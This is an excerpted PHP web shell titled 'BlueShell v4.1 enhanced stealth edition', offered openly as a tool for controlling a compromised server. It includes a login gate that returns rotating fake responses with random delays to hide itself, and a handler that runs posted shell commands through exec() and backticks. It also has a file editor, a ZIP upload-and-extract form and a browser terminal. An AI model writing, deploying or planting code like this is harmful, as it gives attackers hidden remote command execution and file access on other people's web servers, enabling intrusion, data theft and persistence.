...
if (!$valid_auth) {
    // Rotating fake responses with random delays
    $fake_responses = [
...
if (isset($_POST['ajax']) && $_POST['ajax'] === 'cmd') {
    ...
    if (empty($output) && function_exists('exec')) {
        $out = [];
        @exec('cd ' . escapeshellarg($cwd) . ' 2>/dev/null && ' . $cmd . ' 2>&1', $out, $return);
        $output = implode("\n", $out);
    ...
    if (empty($output) && function_exists('system') && !ini_get('safe_mode')) {
        $output = @`cd $cwd 2>/dev/null && $cmd 2>&1`;
...
<head>
    ...
    <style>
        /* ============================================ */
        /* MODIFIED CSS - TRANSPARENT BACKGROUND ONLY   */
        /* PHP FUNCTIONS 100% ORIGINAL - NO CHANGES     */
        /* ============================================ */
        * {
            margin: 0;
            padding: 0;
        ...
        body {
            ...
            background: url('https://i.ibb.co/j9JVgF5m/burung.jpg') no-repeat center center fixed;
...
<body>
    <div class="container">
        ...
        <div class="header">
            <div class="logo">
                ...
                <div class="logo-text">
                    <h1>BlueShell v4.1</h1>
                    <span>enhanced stealth edition</span>
                </div>
            </div>
            <div class="stats">
                <div class="stat-item">
        ...
        ?>
        <div style="background: rgba(10, 25, 47, 0.8); border-radius: 16px; border: 1px solid rgba(33,150,243,0.4); overflow: hidden; backdrop-filter: blur(10px);">
            ...
            <form method="POST" style="padding: 20px;">
                ...
                <textarea name="content" style="width: 100%; min-height: 400px; background: rgba(0,0,0,0.6); color: #a5d6ff; border: 1px solid rgba(33,150,243,0.4); padding: 20px; font-family: monospace; border-radius: 12px; resize: vertical;" <?= !$file_writable ? 'readonly' : '' ?>><?= htmlspecialchars($file_content) ?></textarea>
        ...
        <div id="upload-tab" class="tab-content">
            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px;">
                <div style="background: rgba(10, 25, 47, 0.8); border-radius: 16px; border: 1px solid rgba(33,150,243,0.4); padding: 25px; backdrop-filter: blur(10px);">
                ...
                <div style="background: rgba(10, 25, 47, 0.8); border-radius: 16px; border: 1px solid rgba(33,150,243,0.4); padding: 25px; backdrop-filter: blur(10px);">
                    ...
                    <form method="POST" enctype="multipart/form-data">
                        <input type="file" name="zip_upload" accept=".zip" class="modal-input" required>
    ...
    <div class="modal" id="zipModal"><div class="modal-content"><div class="modal-title">📦 Upload ZIP</div><form method="POST" enctype="multipart/form-data"><input type="file" name="zip_upload" accept=".zip" class="modal-input" required><input type="text" name="extract_path" class="modal-input" placeholder="Extract to"><div class="modal-buttons"><button type="button" class="btn" onclick="hideModal('zip')">Cancel</button><button type="submit" class="btn btn-success">Upload</button></div></form></div></div>
    ...
    <script>
        ...
        function runCommand() {
            ...
            currentAjaxRequest.timeout = 60000;
            currentAjaxRequest.onload = function() {
                ...
                if (currentAjaxRequest.status === 200) {
                    try {
                        ...
                        pre.innerHTML = data.output && data.output.trim() ? escapeHtml(data.output) : '<span style="color: #ff9800;">(no output)</span>';
                        output.appendChild(pre);
                    } catch(e) { output.innerHTML += '<pre style="color:#f44336;">Parse error</pre>'; }
                } else { output.innerHTML += '<pre style="color:#f44336;">Request failed</pre>'; }
                output.scrollTop = output.scrollHeight;
                currentAjaxRequest = null;
            };
            currentAjaxRequest.ontimeout = function() { loadingDiv.remove(); output.innerHTML += '<pre style="color:#f44336;">Timeout</pre>'; currentAjaxRequest = null; };
        ...
        function clearTerminal() { document.getElementById('terminalOutput').innerHTML = '<pre>BlueShell v4.1 Ready</pre>'; document.getElementById('cmdInput').focus(); }
